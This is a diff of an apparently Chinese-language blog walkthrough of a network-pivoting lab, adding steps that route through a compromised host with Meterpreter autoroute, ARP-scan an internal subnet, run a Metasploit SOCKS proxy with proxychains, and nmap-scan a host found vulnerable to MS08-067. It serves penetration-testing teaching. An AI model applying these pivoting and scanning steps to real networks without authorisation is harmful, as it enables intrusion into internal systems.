@@ -121,7 +121,7 @@
 
       <div class="read-time">
         <small>
-          1 minute read
+          3 minute read
         </small>
       </div>
 
@@ -136,7 +136,7 @@
 </div>
 <p><img src="https://pentest.blog/wp-content/uploads/final.png" /></p>
 <div class="highlighter-rouge"><pre class="highlight"><code>说明:
-1)Attacker为攻击者,有一个网卡,网段为172.16.0.0
+1)Attacker为攻击者,有一个网卡,网段为172.16.0.0,Attacker系统为kali系统
 2)RD为第一个已经渗透的目标,有两块网卡,对应172.16.0.0和7.7.7.0两个网段
 3)JC有两块网卡,对应7.7.7.0和8.8.8.0两个网段,JC有ms08-067和efs bof两个漏洞,可getshell
 4)SK有一块网卡,对应8.8.8.0网段,SK有vsftpd的漏洞,可getshell
@@ -186,6 +186,111 @@ IPv4 Address : 7.7.7.11
 IPv4 Netmask : 255.255.255.0
 </code></pre>
 </div>
+<p>发现RD有两块网卡后,想办法渗透另一个网段7.7.7.0,首先要添加路由,操作如下:</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>meterpreter &gt; run autoroute -s 7.7.7.0/24
+[*] Adding a route to 7.7.7.0/255.255.255.0...
+[+] Added route to 7.7.7.0/255.255.255.0 via 172.16.0.11
+[*] Use the -p option to list all active routes
+meterpreter &gt; run autoroute -p
+Active Routing Table
+====================
+ Subnet Netmask Gateway
+ ------ ------- -------
+ 7.7.7.0 255.255.255.0 Session 2
+meterpreter &gt;
+</code></pre>
+</div>
+<p>然后开始扫描7.7.7.0网段,操作如下:</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>meterpreter &gt; run post/windows/gather/arp_scanner RHOSTS=7.7.7.0/24
+[*] Running module against DISCORDIA
+[*] ARP Scanning 7.7.7.0/24
+[*]     IP: 7.7.7.11 MAC 08:00:27:7f:3c:fe (CADMUS COMPUTER SYSTEMS)
+[*]     IP  7.7.7.12 MAC 08:00:27:3a:b2:c1 (CADMUS CIMPUTER SYSTEMS)
+[*]     IP: 7.7.7.20 MAC 08:00:27:fa:a0:c5 (CADMUS COMPUTER SYSTEMS)
+[*]     IP: 7.7.7.255 MAC 08:00:27:3f:2a:b5 (CADMUS COMPUTER SYSTEMS)
+meterpreter &gt;
+</code></pre>
+</div>
+<p>arp_scanner不太够用,不能扫到端口信息,于是用Attacker本机的nmap来扫,首先在RD上开sockets4代理,然后用proxychains设
+置nmap的代理为RD在Attacker的1080端口开启的代理,操作如下:</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>meterpreter &gt; background 
+[*] Backgrounding session 2...
+msf &gt; use auxiliary/server/socks4a 
+msf auxiliary(socks4a) &gt; show options 
+Module options (auxiliary/server/socks4a):
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SRVHOST  0.0.0.0          yes       The address to listen on
+   SRVPORT  1080             yes       The port to listen on.
+Auxiliary action:
+   Name   Description
+   ----   -----------
+   Proxy  
+msf auxiliary(socks4a) &gt; set srvhost 172.16.0.20
+srvhost =&gt; 172.16.0.20
+msf auxiliary(socks4a) &gt; run
+[*] Auxiliary module execution completed
+[*] Starting the socks4a proxy server
+msf auxiliary(socks4a) &gt; netstat -antp | grep 1080
+[*] exec: netstat -antp | grep 1080
+tcp        0      172.16.0.20:1080            0.0.0.0:*               LISTEN      3626/ruby       
+msf auxiliary(socks4a) &gt;
+</code></pre>
+</div>
+<p>proxychains设置/etc/proxychains.conf如下:</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>[ProxyList]
+# add proxy here ...
+# meanwile
+# defaults set to "tor"
+#socks4  127.0.0.1 9050
+socks4  172.16.0.20 1080
+</code></pre>
+</div>
+<p>nmap扫描如下:</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>root@kali:~# proxychains nmap -sT -sV -Pn -n -p22,80,135,139,445 --script=smb-vuln-ms08-067.nse 7.7.7.20
+ProxyChains-3.1 (http://proxychains.sf.net)
+Starting Nmap 7.25BETA1 ( https://nmap.org )
+|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:445-&lt;&gt;&lt;&gt;-OK
+|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:80-&lt;&gt;&lt;&gt;-OK
+|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:135-&lt;&gt;&lt;&gt;-OK
+|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:22-&lt;&gt;&lt;&gt;-OK
+|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:139-&lt;&gt;&lt;&gt;-OK
+|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:22-&lt;&gt;&lt;&gt;-OK
+|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:135-&lt;&gt;&lt;&gt;-OK
+|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:139-&lt;&gt;&lt;&gt;-OK
+|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:445-&lt;&gt;&lt;&gt;-OK
+|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:139-&lt;&gt;&lt;&gt;-OK
+|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:135-&lt;&gt;&lt;&gt;-OK
+|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:445-&lt;&gt;&lt;&gt;-OK
+Nmap scan report for 7.7.7.20
+Host is up (0.17s latency).
+PORT     STATE    SERVICE      VERSION
+22/tcp   open     ssh          Bitvise WinSSHD 7.16 (FlowSsh 7.15; protocol 2.0)
+80/tcp   closed   http         Easy File Sharing Web Server httpd 6.9
+135/tcp  open     msrpc        Microsoft Windows RPC
+139/tcp  open     netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp  open     microsoft-ds Microsoft Windows 2003 or 2008 microsoft-ds
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_server_2003
+Host script results:
+| smb-vuln-ms08-067: 
+|   VULNERABLE:
+|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
+|     State: VULNERABLE
+|     IDs: CVE:CVE-2008-4250
+|          The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2, 
+|          Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary 
+|          code via a crafted RPC request that triggers the overflow during path canonicalization.
+| 
+|     Disclosure date: 2008-10-23
+|     References:
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
+|_      https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 12.51 seconds
+root@kali:~#
+</code></pre>
+</div>
+
 </span>
 
         
